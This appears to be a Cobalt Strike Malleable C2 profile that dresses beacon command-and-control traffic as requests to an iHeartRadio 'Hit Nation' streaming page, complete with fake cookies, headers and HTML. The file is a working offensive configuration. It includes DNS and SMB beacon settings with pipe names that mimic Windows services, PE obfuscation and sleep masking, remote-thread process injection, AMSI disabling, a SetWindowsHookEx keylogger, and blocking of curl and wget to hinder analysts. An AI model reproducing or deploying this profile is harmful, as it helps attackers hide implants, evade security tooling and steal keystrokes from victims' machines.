#iheartradio
#chose a popular top 40 station 'hit-nation'..
#xx0hcd

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)";

set data_jitter "50";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

#custom cert
#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
#    set headers "Server, Content-Type, Cache-Control, Connection";

#    header "Connection" "close";
#    header "Cache-Control" "max-age=2";
#    header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

http-get {

    set uri "/live/hit-nation-4222/";
    
    client {

	header "Host" "www.iheart.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
	
        
        metadata {
            base64url;
            
	    prepend "GED_PLAYLIST_ACTIVITY=";
	    prepend "_gads=ID=53c4a:S=ALNI_M32;";
	    prepend "uid=1492;";
	    prepend "pid=3913;";
	    prepend "ihr_c=US;id=HdqX;";
	    header "Cookie";

        }

    }

    server {

	header "Content-Type" "text/html; charset=utf-8";
	header "Edge-Control" "cache-maxage=3600";
	header "Server" "nginx/1.4.6 (Ubuntu)";
	header "X-Powered-By" "Express";
	header "Access-Control-Allow-Origin" "*";
	header "Accept-Ranges" "bytes";
	header "Via" "1.1 varnish";
	header "Age" "315";
	header "Connection" "close";
	header "X-Served-By" "cache-dfw1822-DFW";
	header "X-Cache" "HIT";
	header "X-Cache-Hits" "1";
	header "X-Timer" "S1499866924.089752,VS0,VE1";
        

        output {

            base64url;

	    prepend "<!DOCTYPE html>
    <html lang='en' xmlns:fb='http://ogp.me/ns/fb'>
    <head>
      <title>Listen to Hit Nation Radio Live - All of Today's Biggest Hits | iHeartRadio</title>
      <meta data-react-helmet='true' charset='utf-8'/><meta data-react-helmet='true' name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no'/><meta data-react-helmet='true' name='mobile-web-app-capable' content='yes'/> <link data-react-helmet='true' rel='shortcut icon' href='/assets/favicon.cf2eff6db48eda72637f3c01d6ce99ae.ico?rev=7.33.1' type='image/ico'/><link data-react-helmet='true' rel='apple-touch-icon' href='/assets/apple-touch-icon.40395b8a92866d7206175b320b251cd3.png?rev=7.33.1'/><link data-react-helmet='true' rel='shortcut icon' href='/assets/apple-touch-icon.40395b8a92866d7206175b320b251cd3.png?rev=7.33.1'/><link data-react-helmet='true' rel='chrome-webstore-item' href='https://chrome.google.com/webstore/detail/iheartradio/djfamdpdfnbdehpafbeefbpobbohmfnc'/><link data-react-helmet='true' rel='manifest' href='/assets/manifest.828b7817d23e2d62cf3d7e797ae0056f.json?rev=7.33.1'/>
      <link rel='alternate' href='android-app://com.clearchannel.iheartradio.controller/ihr/goto/live/4422' data-reactid='2'/><link rel='alternate' href='ios-app://290638154/ihr/goto/live/4422' data-reactid='3'/><link rel='search' type='application/opensearchdescription+xml' title='iHeartRadio' href='/assets/opensearch.bb1705850ffcb01dd81ec10d6e177d1c.xml?rev=7.33.1' data-reactid='4'/><link href='https://plus.google.com/+iHeartRadio' rel='author' data-reactid='5'/><link href='https://plus.google.com/+iHeartRadio' rel='publisher' data-reactid='6'/><link rel='canonical' href='https://www.iheart.com/live/hit-nation-4422/' data-reactid='7'/><link rel='image_src' href='https://iscale.iheart.com/catalog/live/4422' data-reactid='8'/><meta name='thumbnail' content='https://iscale.iheart.com/catalog/live/4422' data-reactid='9'/><meta name='description' content='Listen to Hit Nation Live for Free! Hear All of Today&#x27;s Biggest Hits, only on iHeartRadio.' data-reactid='10'/><meta name='keywords' content='Listen,Live,Hit Nation,Digital,NAT,Music,Talk,Radio,Top 40 &amp; Pop,Online,Streaming,Free,iHeartRadio,iHeart' data-reactid='11'/><meta name='twitter:label1' content='Genre' data-reactid='12'/><meta name='twitter:data1' content='Top 40 &amp; Pop' data-reactid='13'/><meta name='twitter:label2' content='Location' data-reactid='14'/><meta name='twitter:data2' content='DIGITAL-NAT' data-reactid='15'/><meta property='fb:app_id' content='121897277851831' data-reactid='16'/> content='https://iscale.iheart.com/catalog/live/4422' data-reactid='21'/>
      <style class='server-style-loader-element'><href='https://www.iheart.com/live/hit-nation-4422/?autoplayid=";


	    append "<meta property='og:site_name' content='iHeartRadio' data-reactid='22'/><meta property='og:description' content='Listen to Hit Nation Live for Free! Stream Top 40 &amp; Pop songs online from this radio station, only on iHeartRadio.' data-reactid='23'/><meta itemprop='name' content='Listen to Hit Nation Radio Live - All of Today&#x27;s Biggest Hits' data-reactid='24'/><meta  name='twitter:app:name:googleplay' content='iHeartRadio' data-reactid='46'/><meta name='twitter:app:id:googleplay' content='com.clearchannel.iheartradio.controller' data-reactid='47'/><meta property='al:ios:app_store_id' content='290638154' data-reactid='48'/><meta property='al:ios:app_name' content='iHeartRadio' data-reactid='49'/><meta property='al:android:package' content='com.clearchannel.iheartradio.controller' data-reactid='50'/><meta property='al:android:app_name' content='iHeartRadio' data-reactid='51'/>
      <link rel='stylesheet' type='text/css' href='/assets/web-styles.c28d83ef1f71cb7b9282646a7edecdb0.css?rev=7.33.1'></link>
</div></div></div><div id='dialog' data-reactid='103'></div><div id='dialog-secondary' data-reactid='104'></div><div data-reactid='105'><!-- react-empty: 106 --></div><!-- react-empty: 107 --><div data-reactid='108'></div><div data-reactid='109'></div><div class='growls no-growls' data-reactid='110'></div><div class='adblock-bait pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links' data-reactid='111'></div></div></div>
      <div id='jw-wrapper' class='hidden'>
        <div id='jw-player'></div>
      </div>
      <div id='ads-wrapper' class='hidden'>
        <a id='ads-learn-more' target='_blank'>Learn More</a>
        <div id='ads-player'></div>
      </div>
      <script src=/a/locale/?rel=7.33.1></script>
      <script src=/assets/vendor.a465f0a08a077b19e744.js?rev=7.33.1></script>
      <script src=/assets/web.a465f0a08a077b19e744.js?rev=7.33.1></script>
    </body>
  </html>";

            print;
        }
    }
}

http-post {
    
    set uri "/Live/hit-nation-4222/";
    set verb "GET";

    client {

	header "Host" "www.iheart.com";
	header "Accept" "*/*";     
        
        output {
            base64url;
	    
	    prepend "GED_PLAYLIST_ACTIVITY=";
	    prepend "_gads=ID=53c4a:S=ALNI_M32;";
	    prepend "uid=1492;";
	    prepend "pid=3913;";
	    prepend "ihr_c=US;id=HdqX;";
	    header "Cookie";


        }


        id {
            base64url;

	    parameter "autoplay";

        }
    }

    server {

	header "Content-Type" "text/html; charset=utf-8";
	header "Edge-Control" "cache-maxage=3600";
	header "Server" "nginx/1.4.6 (Ubuntu)";
	header "X-Powered-By" "Express";
	header "Access-Control-Allow-Origin" "*";
	header "Accept-Ranges" "bytes";
	header "Via" "1.1 varnish";
	header "Age" "315";
	header "Connection" "close";
	header "X-Served-By" "cache-dfw1822-DFW";
	header "X-Cache" "HIT";
	header "X-Cache-Hits" "1";
	header "X-Timer" "S1499866924.089752,VS0,VE1";
        
        #just keeping output together for responses
        output {
            base64;

            prepend "<!DOCTYPE html>
    <html lang='en' xmlns:fb='http://ogp.me/ns/fb'>
    <head>
      <title>Listen to Hit Nation Radio Live - All of Today's Biggest Hits | iHeartRadio</title>
      <meta data-react-helmet='true' charset='utf-8'/><meta data-react-helmet='true' name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no'/><meta data-react-helmet='true' name='mobile-web-app-capable' content='yes'/> <link data-react-helmet='true' rel='shortcut icon' href='/assets/favicon.cf2eff6db48eda72637f3c01d6ce99ae.ico?rev=7.33.1' type='image/ico'/><link data-react-helmet='true' rel='apple-touch-icon' href='/assets/apple-touch-icon.40395b8a92866d7206175b320b251cd3.png?rev=7.33.1'/><link data-react-helmet='true' rel='shortcut icon' href='/assets/apple-touch-icon.40395b8a92866d7206175b320b251cd3.png?rev=7.33.1'/><link data-react-helmet='true' rel='chrome-webstore-item' href='https://chrome.google.com/webstore/detail/iheartradio/djfamdpdfnbdehpafbeefbpobbohmfnc'/><link data-react-helmet='true' rel='manifest' href='/assets/manifest.828b7817d23e2d62cf3d7e797ae0056f.json?rev=7.33.1'/>
      <link rel='alternate' href='android-app://com.clearchannel.iheartradio.controller/ihr/goto/live/4422' data-reactid='2'/><link rel='alternate' href='ios-app://290638154/ihr/goto/live/4422' data-reactid='3'/><link rel='search' type='application/opensearchdescription+xml' title='iHeartRadio' href='/assets/opensearch.bb1705850ffcb01dd81ec10d6e177d1c.xml?rev=7.33.1' data-reactid='4'/><link href='https://plus.google.com/+iHeartRadio' rel='author' data-reactid='5'/><link href='https://plus.google.com/+iHeartRadio' rel='publisher' data-reactid='6'/><link rel='canonical' href='https://www.iheart.com/live/hit-nation-4422/' data-reactid='7'/><link rel='image_src' href='https://iscale.iheart.com/catalog/live/4422' data-reactid='8'/><meta name='thumbnail' content='https://iscale.iheart.com/catalog/live/4422' data-reactid='9'/><meta name='description' content='Listen to Hit Nation Live for Free! Hear All of Today&#x27;s Biggest Hits, only on iHeartRadio.' data-reactid='10'/><meta name='keywords' content='Listen,Live,Hit Nation,Digital,NAT,Music,Talk,Radio,Top 40 &amp; Pop,Online,Streaming,Free,iHeartRadio,iHeart' data-reactid='11'/><meta name='twitter:label1' content='Genre' data-reactid='12'/><meta name='twitter:data1' content='Top 40 &amp; Pop' data-reactid='13'/><meta name='twitter:label2' content='Location' data-reactid='14'/><meta name='twitter:data2' content='DIGITAL-NAT' data-reactid='15'/><meta property='fb:app_id' content='121897277851831' data-reactid='16'/> content='https://iscale.iheart.com/catalog/live/4422' data-reactid='21'/>
      <style class='server-style-loader-element'><href='https://www.iheart.com/live/hit-nation-4422/?autoplayid=";


	    append "<meta property='og:site_name' content='iHeartRadio' data-reactid='22'/><meta property='og:description' content='Listen to Hit Nation Live for Free! Stream Top 40 &amp; Pop songs online from this radio station, only on iHeartRadio.' data-reactid='23'/><meta itemprop='name' content='Listen to Hit Nation Radio Live - All of Today&#x27;s Biggest Hits' data-reactid='24'/><meta  name='twitter:app:name:googleplay' content='iHeartRadio' data-reactid='46'/><meta name='twitter:app:id:googleplay' content='com.clearchannel.iheartradio.controller' data-reactid='47'/><meta property='al:ios:app_store_id' content='290638154' data-reactid='48'/><meta property='al:ios:app_name' content='iHeartRadio' data-reactid='49'/><meta property='al:android:package' content='com.clearchannel.iheartradio.controller' data-reactid='50'/><meta property='al:android:app_name' content='iHeartRadio' data-reactid='51'/>
      <link rel='stylesheet' type='text/css' href='/assets/web-styles.c28d83ef1f71cb7b9282646a7edecdb0.css?rev=7.33.1'></link>
</div></div></div><div id='dialog' data-reactid='103'></div><div id='dialog-secondary' data-reactid='104'></div><div data-reactid='105'><!-- react-empty: 106 --></div><!-- react-empty: 107 --><div data-reactid='108'></div><div data-reactid='109'></div><div class='growls no-growls' data-reactid='110'></div><div class='adblock-bait pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links' data-reactid='111'></div></div></div>
      <div id='jw-wrapper' class='hidden'>
        <div id='jw-player'></div>
      </div>
      <div id='ads-wrapper' class='hidden'>
        <a id='ads-learn-more' target='_blank'>Learn More</a>
        <div id='ads-player'></div>
      </div>
      <script src=/a/locale/?rel=7.33.1></script>
      <script src=/assets/vendor.a465f0a08a077b19e744.js?rev=7.33.1></script>
      <script src=/assets/web.a465f0a08a077b19e744.js?rev=7.33.1></script>
    </body>
  </html>";

            print;
        }
    }
}

http-stager {

    set uri_x86 "/Console";
    set uri_x64 "/console";

    client{
        header "Host" "www.iheart.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
    }

    server {
        header "Server" "nginx/1.4.6 (Ubuntu)";
        header "Content-Type" "text/html; charset=utf-8";
        header "Connection" "close";
    
    }


}

###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "17 Oct 2020 04:32:14";
    set entry_point     "170001";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";


}
